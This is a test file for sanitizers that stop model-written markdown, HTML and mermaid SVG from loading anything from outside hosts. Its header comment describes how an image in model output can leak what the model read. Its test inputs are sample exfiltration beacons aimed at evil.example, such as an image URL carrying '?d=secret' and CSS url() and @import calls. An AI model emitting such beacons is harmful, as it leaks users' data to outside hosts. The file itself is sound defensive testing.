// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { markdownToHtml } from './render'
import { sanitizeUntrusted, sanitizeUntrustedSvg } from './untrusted'

// #1099: model output is text another page could have written. An image in it
// loads the moment it renders — while the answer is still streaming — and its
// URL can carry whatever the model read under the asker's scope. So text from
// a model loads nothing from any host by itself.

const ATT = '/v1/documents/11111111-1111-4111-8111-111111111111/attachments/22222222-2222-4222-8222-222222222222/content'
const LOADS = /<(picture|source|video|audio|track|image|feimage|mglyph)\b|\s(srcset|background|poster)=/i

const render = (markdown: string) => sanitizeUntrusted(markdownToHtml(markdown))

describe('sanitizeUntrusted', () => {
  it('turns an external markdown image into a plain link', () => {
    const html = render('Done. ![status](https://evil.example/p.png?d=secret)')
    expect(html).not.toMatch(/<img/)
    expect(html).toContain('<a href="https://evil.example/p.png?d=secret" target="_blank" rel="noopener noreferrer nofollow">status</a>')
  })

  it('names the link by its URL when the image has no alt text', () => {
    expect(render('![](https://evil.example/p.png)')).toContain('>https://evil.example/p.png</a>')
  })

  it('keeps an attachment image, and a data: image, which load from no other host', () => {
    expect(render(`![diagram](${ATT})`)).toContain(`<img src="${ATT}" alt="diagram">`)
    expect(render('<img src="data:image/png;base64,AAAA">')).toContain('<img src="data:image/png;base64,AAAA">')
  })

  it('drops a member-only path and a protocol-relative one, leaving the alt text', () => {
    const html = render('![me](/v1/users/u1/avatar) ![x](//evil.example/p.png)')
    expect(html).not.toMatch(/<img|<a /)
    expect(html).toContain('me')
  })

  it('does not nest a link inside a link', () => {
    const html = render('[![badge](https://evil.example/b.svg)](https://example.com/)')
    expect(html).not.toMatch(/<img/)
    expect(html.match(/<a /g)).toHaveLength(1)
  })

  it.each([
    ['srcset', '<img src="data:image/png;base64,AAAA" srcset="https://evil.example/b.png 2x">'],
    ['picture', '<picture><source srcset="https://evil.example/c.png"></picture>'],
    ['video', '<video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"><track src="https://evil.example/t.vtt"></video>'],
    ['audio', '<audio src="https://evil.example/a.mp3"></audio>'],
    ['svg image', '<svg><image href="https://evil.example/s.png"></image><feImage href="https://evil.example/f.png"></feImage></svg>'],
    ['background', '<table background="https://evil.example/bg.png"><tr><td background="https://evil.example/td.png">x</td></tr></table>'],
    ['mglyph', '<math><mglyph src="https://evil.example/m.png"></mglyph></math>'],
  ])('loads nothing through %s', (_, html) => {
    expect(sanitizeUntrusted(html)).not.toMatch(LOADS)
    expect(sanitizeUntrusted(html)).not.toContain('evil.example')
  })

  it('still applies the trusted rules: no script, no style, no form', () => {
    expect(sanitizeUntrusted('<p>x</p><script>1</script><style>a{}</style><form action="https://e/"></form>')).toBe('<p>x</p>')
  })
})

describe('sanitizeUntrustedSvg', () => {
  // A model can write a mermaid diagram, and an init directive's themeCSS
  // lands in the SVG's own <style>; mermaid screens it for < and > only.
  it('removes remote url() and @import from an SVG stylesheet, keeping local references', () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil.example/a.css); #m .node{fill:red;background:url("https://evil.example/x?d=1")} .e{marker-end:url(#arrow)}</style>' +
      '<path marker-end="url(#arrow)" fill="url(https://evil.example/p.svg#g)"></path><image href="https://evil.example/i.png"></image></svg>'
    const out = sanitizeUntrustedSvg(svg)
    expect(out).not.toContain('evil.example')
    expect(out).toContain('fill:red')
    expect(out).toContain('marker-end:url(#arrow)')
    expect(out).toContain('marker-end="url(#arrow)"')
  })
})
